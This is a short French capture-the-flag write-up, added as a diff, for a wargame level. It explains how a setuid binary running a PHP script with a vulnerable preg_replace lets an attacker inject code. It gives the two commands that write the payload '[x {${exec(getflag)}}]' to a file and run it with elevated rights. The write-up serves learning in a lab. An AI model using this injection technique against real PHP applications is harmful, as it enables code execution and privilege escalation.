@@ -1,0 +1,11 @@
+le script level06 a les droits de son createur donc de flag06 et utilise le script level06.php (visible avec un `strings` dessus)
+
+le script level06.php utilise une fct x qui preg_replace a un moment avec le modele `\[x (.*)\])`
+on peut donc remplacer `(.*)` par n'importe quoi
+notre but est d'executer `getflag`
+
+on va donc ecrire dans un fichier la commande permettant d'executer getflag en php par levele06.php :
+echo '[x {${exec(getflag)}}]' > /tmp/flag
+
+ensuite le script level06 va prendre ce fichier en parametre pour l'executer (puisqu'il a les droits de flag06, on aura le flag):
+./level06 /tmp/flag
